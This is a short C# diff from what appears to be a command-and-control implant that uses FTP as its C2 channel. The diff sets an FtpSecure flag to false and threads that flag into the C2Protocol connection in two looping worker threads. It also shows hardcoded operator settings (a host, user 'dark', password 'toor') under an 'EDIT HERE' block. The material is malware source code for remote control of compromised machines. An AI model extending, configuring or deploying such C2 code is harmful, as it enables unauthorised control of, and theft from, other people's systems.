@@ -48,7 +48,7 @@ class Program
     public static readonly string FtpHost = "127.0.0.1";
     public static readonly string FtpUser = "dark";
     public static readonly string FtpPwd = "toor";
-    public static readonly bool FtpSecure = true;    
+    public static readonly bool FtpSecure = false;    
 
     public static readonly int SynchronizeDelay = 1000;
     // EDIT HERE END ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
@@ -472,7 +472,7 @@ class Program
             if (obj == null)
                 return;
 
-            C2Protocol c2Protocol = new(FtpHost, FtpUser, FtpPwd);
+            C2Protocol c2Protocol = new(FtpHost, FtpUser, FtpPwd, FtpSecure);
 
             CancellationToken cancellationToken = (CancellationToken)obj;
             while (!cancellationToken.IsCancellationRequested)
@@ -499,7 +499,7 @@ class Program
             if (obj == null)
                 return;
 
-            C2Protocol c2Protocol = new(FtpHost, FtpUser, FtpPwd);
+            C2Protocol c2Protocol = new(FtpHost, FtpUser, FtpPwd, FtpSecure);
 
             CancellationToken cancellationToken = (CancellationToken)obj;
             while (!cancellationToken.IsCancellationRequested)
